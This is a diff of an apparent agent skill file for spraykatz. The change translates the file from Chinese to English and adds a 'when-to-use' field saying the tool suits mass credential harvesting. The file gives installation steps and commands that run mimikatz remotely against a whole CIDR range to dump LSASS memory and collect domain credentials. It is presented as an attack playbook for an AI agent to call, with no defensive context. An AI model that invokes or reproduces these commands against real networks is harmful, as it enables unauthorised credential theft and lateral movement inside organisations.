@@ -2,37 +2,41 @@
 name: spraykatz-credentials
 description: "spraykatz runs remote mimikatz in domain. Signals: memory dump, lsass, remote credential harvesting, wordlist"
 zh-signals: "spraykatz: 域内远程 mimikatz。信号:内存转储,lsass,远程凭据收割,wordlist。"
+when-to-use: >-
+  Use in a domain environment when you have a valid account and want to batch
+  remote mimikatz against many hosts over a CIDR to harvest credentials from
+  LSASS.
 ---
 
 # spraykatz
 
-- 攻击大类:C24 内存转储与LSASS窃取
-- 上游仓库:https://github.com/aas-n/spraykatz
-- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C24 Memory Dumping and LSASS Theft
+- Upstream Repository: https://github.com/aas-n/spraykatz
+- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/aas-n/spraykatz && cd spraykatz && pip install -r requirements.txt
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `python3 spraykatz.py -u admin -p pass -t 10.0.0.0/24` | 远程凭据收割 |
-| `-t cidr -u u -p p` | 凭据 |
+| `python3 spraykatz.py -u admin -p pass -t 10.0.0.0/24` | Remote credential harvesting |
+| `-t cidr -u u -p p` | Credentials |
 | `-w` | wordlist |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### 域内远程 mimikatz
+### Remote Mimikatz in the Domain
 
 ```bash
 python3 spraykatz.py -u svc -p pass -t 10.0.0.0/24
-# 批量远程 lsass dump
+# batch remote lsass dump
 ```
 
-## 注意事项
+## Notes
 
-远程批量 mimikatz。
+Remote batch Mimikatz.
